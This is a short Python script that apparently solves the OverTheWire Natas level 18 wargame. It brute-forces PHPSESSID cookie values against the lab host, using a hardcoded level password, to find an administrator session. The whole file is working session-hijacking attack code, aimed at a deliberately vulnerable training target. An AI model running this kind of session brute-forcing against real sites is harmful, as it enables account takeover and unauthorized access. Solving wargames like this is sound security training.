import requests

max_id = 641
username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
matcher = 'Password: '
for i in range(max_id):
    session_info = {'PHPSESSID': str(i)}
    req = requests.get(
        "http://natas18.natas.labs.overthewire.org/",
        auth=(username, password),
        cookies=session_info
    )

    if matcher in req.text:
        print(req.text)
